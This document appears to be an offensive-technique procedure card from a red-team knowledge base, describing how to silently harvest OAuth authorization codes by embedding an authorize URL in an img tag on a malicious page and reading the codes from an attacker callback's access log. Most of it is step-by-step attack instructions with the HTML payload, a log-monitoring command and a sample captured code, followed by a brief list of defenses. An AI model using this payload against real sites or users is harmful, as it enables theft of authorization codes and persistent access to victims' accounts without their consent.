---
id: proc-oauth-silent-code-gen-001
tags:
  - silent-auth
  - persistence
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/html-silent-authorize]]'
  - '[[commands/tail-access-log]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:32:38.780Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Silent-Authorization-Code-Generation-for-Persistence

## Summary

This procedure embeds OAuth authorization requests in HTML img tags on a malicious site, silently generating new codes when victims load the page, enabling ongoing access without interaction.

## Description

By loading the /oauth/authorize URL via an img src, the victim's browser automatically follows the redirect if logged in, posting the code to the attacker's callback without prompts. Monitor the callback logs to capture codes. This provides a stealthy way to harvest codes for token exchanges, enhancing persistence. Requires victim to visit the site while authenticated to the provider.

## Requirements

1. Malicious web server hosting HTML.
2. Controlled redirect URI (callback).
3. Victim access to the site.

## Defense

Defensive measures and detection strategies:

- Detect automated authorize requests without user agents.
- Require user confirmation for all auth flows.
- Block img src to OAuth domains via CSP.

## Objectives

1. Silently trigger auth flow.
2. Capture new codes.
3. Maintain supply of codes for exploitation.

## Instructions

### Step 1: Create Malicious HTML

**Context**: Embed authorize URL in img.

**Command** ([[commands/html-silent-authorize]]):
```html
<html>
 <img src="https://OAUTH2-PROVIDER-DOMAIN/oauth2/authorize?client_id=%CLIENT_ID%&response_type=code&redirect_uri=https://avuln.com/callback&state=0123456789abcdef">
</html>
```

> Host on attacker server; %CLIENT_ID% is your app ID.

### Step 2: Lure and Monitor

**Context**: Get victim to load page, watch callback.

**Command** ([[commands/tail-access-log]]):
```bash
tail -f access.log
```

> Expected: Log like "GET /callback?state=0123456789abcdef&code=xlDxVYdnJlsAAAAAAAAFQDUmzla7P8Jg9fM2rNxwP8U HTTP/1.1" 200.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques

-

## Commands Used

- [[commands/html-silent-authorize]]
- [[commands/tail-access-log]]

## Tools Used

- [[tools/curl]]

## Tags

- [[silent-auth]]
- [[Persistence]]
